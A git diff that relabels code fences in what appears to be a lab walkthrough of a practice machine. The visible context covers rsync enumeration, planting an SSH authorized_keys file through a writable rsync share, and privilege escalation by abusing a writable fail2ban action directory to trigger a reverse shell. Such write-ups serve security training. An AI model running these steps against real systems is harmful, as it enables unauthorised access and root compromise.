@@ -30,10 +30,10 @@ Nmap done: 1 IP address (1 host up) scanned in 27.36 seconds
 Rsync is a directory sharing protocol used on Unix systems
 
 The protocol can be scanned for available folders using an nmap script
-~~~bash
+~~~shell
 nmap -sV --script "rsync-list-modules" -p 873 192.168.194.126
 ~~~
-~~~bash
+~~~shell
 PORT    STATE SERVICE VERSION
 873/tcp open  rsync   (protocol version 31)
 | rsync-list-modules: 
@@ -41,10 +41,10 @@ PORT    STATE SERVICE VERSION
 ~~~
 
 The contents of the fox folder revealed the contents of an empty home directory
-~~~bash
+~~~shell
 rsync -av --list-only rsync://192.168.194.126/fox
 ~~~
-~~~bash
+~~~shell
 receiving incremental file list
 drwxr-xr-x          4,096 2021/01/21 14:21:59 .
 lrwxrwxrwx              9 2020/12/03 20:22:42 .bash_history -> /dev/null
@@ -57,7 +57,7 @@ total size is 4,562  speedup is 29.24
 ~~~
 
 The contents of the fox folder can be retrieved and stored locally using the command
-~~~bash
+~~~shell
 rsync -av rsync://192.168.194.126/fox ./rsyn_shared
 ~~~
 These files reveal no useful information to further our progress.
@@ -68,7 +68,7 @@ give us a remote connection to the machine.
 # Exploitation
 
 Generate SSH Key
-~~~bash
+~~~shell
 ┌──(kali㉿kali)-[~/Desktop/Fail]
 └─$ ssh-keygen                                       
 Generating public/private rsa key pair.
@@ -94,12 +94,12 @@ The key's randomart image is:
 ~~~
 
 Copy our .ssh directory locally
-~~~bash
+~~~shell
 cp -R /home/kali/.ssh .
 ~~~
 
 Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
-~~~bash
+~~~shell
 ┌──(kali㉿kali)-[~/Desktop/Fail]
 └─$ cd .ssh
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
@@ -107,12 +107,12 @@ Rename id_rsa.pub (our public key) to authorized_keys before transferring to the
 ~~~
 
 Upload the .ssh file (containing authorized_keys) to Rsync
-~~~bash
+~~~shell
 rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
 ~~~
 
 SSH into the target machine
-~~~bash
+~~~shell
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
 └─$ ssh -i ./id_rsa fox@192.168.194.126
 The authenticity of host '192.168.194.126 (192.168.194.126)' can't be established.
@@ -136,7 +136,7 @@ $
 
 After running Linpeas.sh a directory /etc/fail2ban was identified which is writable by our user
 
-~~~bash
+~~~shell
 ╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                            
   Group fail2ban:                                                                                                                                                            
@@ -151,7 +151,7 @@ You_can_write_even_more_files_inside_last_directory
 
 A manual verification of this vulnerability was ran which identified full Read, Write, Execute (RWX) permissions over a file named action.d which is ran by Root
 
-~~~bash
+~~~shell
 $ find /etc -writable -ls 2>/dev/null
    787482      4 drwxrwxr-x   2 root     fail2ban     4096 Dec  3  2020 /etc/fail2ban/action.d
 ~~~
@@ -181,7 +181,7 @@ After
 Start a listener on port 80
 
 Attempt to log in with invalid credentials to execute the Fail2Ban and execute our reverse shell
-~~~bash
+~~~shell
 ┌──(kali㉿kali)-[~]
 └─$ ssh root@192.168.194.126                    
 root@192.168.194.126's password: 
